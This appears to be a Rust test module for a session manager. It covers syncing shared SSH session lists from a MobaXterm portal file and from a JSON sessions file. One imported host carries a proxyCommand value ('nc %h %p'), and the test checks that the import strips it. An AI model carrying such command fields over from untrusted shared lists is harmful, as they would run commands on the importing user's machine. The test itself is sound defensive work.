    use super::*;

    // What a lab portal publishes for MobaXterm's shared sessions.
    const PORTAL_FILE: &str = "[Bookmarks_1]
SubRep=clab
ImgNum=41
node0 [sudo]=#196#0%node0.lab.example.net%22%alice%%-1%-1%%%%%0%0%0%%%-1%0%0%0%%1080%%0%0%1#MobaFont%10%0%0%-1%15%236,236,236%30,30,30%180,180,192%0%-1%0%%xterm%-1%0%_Std_Colors_0_%80%24%0%1%-1%<none>%%0%0%-1%-1#0# clab, sudo #-1
node1=#109#0%node1.lab.example.net%2222%alice%%-1%-1%%%%%0%0%0%%%-1%0%0%0%%1080%%0%0%1#MobaFont%10
";

    #[tokio::test]
    async fn reads_the_link_and_makes_its_hosts_match() {
        let lab = Lab::start().await;
        lab.portal.answers(|_| ok(PORTAL_FILE.as_bytes()));
        let source = lab.add_source(json!({})).await;

        // Just added: whoever added it reads it, so an automatic check leaves it alone.
        assert_eq!(
            lab.backend()
                .sync_shared_sessions(&source.id, false)
                .await
                .unwrap(),
            None
        );
        let first = lab
            .backend()
            .sync_shared_sessions(&source.id, true)
            .await
            .unwrap()
            .unwrap();
        assert_eq!(
            (first.added, first.updated, first.removed, first.unchanged),
            (2, 0, 0, 0)
        );
        assert_eq!(first.source.host_count, 2);
        let hosts = lab.profiles().await;
        let placed: Vec<(&str, Option<&str>)> = hosts
            .iter()
            .map(|host| (host.name.as_str(), host.metadata.group.as_deref()))
            .collect();
        assert_eq!(
            placed,
            [
                ("node0 [sudo]", Some("Lab/clab")),
                ("node1", Some("Lab/clab"))
            ]
        );
        assert!(hosts.iter().all(|host| host.id.starts_with("shared-")));

        // The same list again changes nothing; one entry less removes its host.
        let again = lab
            .backend()
            .sync_shared_sessions(&source.id, true)
            .await
            .unwrap()
            .unwrap();
        assert_eq!((again.added, again.updated, again.unchanged), (0, 0, 2));
        lab.portal.answers(|_| {
            let shorter: String = PORTAL_FILE
                .lines()
                .filter(|line| !line.starts_with("node1="))
                .map(|line| format!("{line}\n"))
                .collect();
            ok(shorter.as_bytes())
        });
        let shorter = lab
            .backend()
            .sync_shared_sessions(&source.id, true)
            .await
            .unwrap()
            .unwrap();
        assert_eq!((shorter.removed, shorter.unchanged), (1, 1));
        assert_eq!(lab.profiles().await.len(), 1);
    }

    #[tokio::test]
    async fn keeps_the_hosts_when_the_link_stops_returning_a_list() {
        let lab = Lab::start().await;
        lab.portal.answers(|_| ok(PORTAL_FILE.as_bytes()));
        let source = lab.add_source(json!({})).await;
        lab.backend()
            .sync_shared_sessions(&source.id, true)
            .await
            .unwrap();

        // The portal's session ran out: it answers with its sign-in page.
        lab.portal
            .answers(|_| ok(b"<!DOCTYPE html><html><body>Sign in</body></html>"));
        let error = lab
            .backend()
            .sync_shared_sessions(&source.id, true)
            .await
            .unwrap_err();

        assert_eq!(
            error.message,
            "The link returned a web page instead of a session list. It may need a sign-in."
        );
        assert_eq!(lab.profiles().await.len(), 2);
        let stored = &lab.sources().await[0];
        assert_eq!(stored.last_error.as_deref(), Some(error.message.as_str()));
        assert_eq!(stored.host_count, 2);

        // Signed in again, the next check clears the problem.
        lab.portal.answers(|_| ok(PORTAL_FILE.as_bytes()));
        lab.backend()
            .sync_shared_sessions(&source.id, true)
            .await
            .unwrap();
        assert_eq!(lab.sources().await[0].last_error, None);
    }

    #[tokio::test]
    async fn follows_a_folder_another_muxus_shared_as_a_file() {
        let lab = Lab::start().await;
        let directory = tempfile::tempdir().unwrap();
        let file = directory.path().join("lab.muxus-sessions.json");
        std::fs::write(
            &file,
            json!({
                "format": "muxus-shared-sessions",
                "version": 1,
                "name": "Lab",
                "createdAt": "2026-11-20T10:00:00.000Z",
                "hosts": [
                    {
                        "id": "bastion", "name": "bastion", "folder": "Jump hosts",
                        "profile": { "kind": "ssh", "target": "bastion.example.net", "useConfig": false },
                    },
                    {
                        "id": "leaf", "name": "leaf", "folder": "Fabric", "icon": "router",
                        "profile": {
                            "kind": "ssh", "target": "leaf-01.lab.example.net", "useConfig": false,
                            "proxyJump": ["muxus-host:bastion"], "proxyCommand": "nc %h %p",
                        },
                    },
                ],
            })
            .to_string(),
        )
        .unwrap();
        let source = lab
            .add_source(json!({ "url": file.to_string_lossy(), "folder": "Team lab" }))
            .await;

        let result = lab
            .backend()
            .sync_shared_sessions(&source.id, true)
            .await
            .unwrap()
            .unwrap();

        assert_eq!(result.added, 2);
        let hosts = lab.profiles().await;
        let bastion = hosts.iter().find(|host| host.name == "bastion").unwrap();
        let leaf = hosts.iter().find(|host| host.name == "leaf").unwrap();
        assert_eq!(
            bastion.metadata.group.as_deref(),
            Some("Team lab/Jump hosts")
        );
        assert_eq!(leaf.metadata.group.as_deref(), Some("Team lab/Fabric"));
        assert_eq!(leaf.metadata.icon.as_deref(), Some("router"));
        let profile = serde_json::to_value(&leaf.profile).unwrap();
        // The hop names the host the list brought, and what would run here is gone.
        assert_eq!(
            profile["proxyJump"],
            json!([format!("muxus-host:{}", bastion.id)])
        );
        assert_eq!(profile.get("proxyCommand"), None);
    }
}
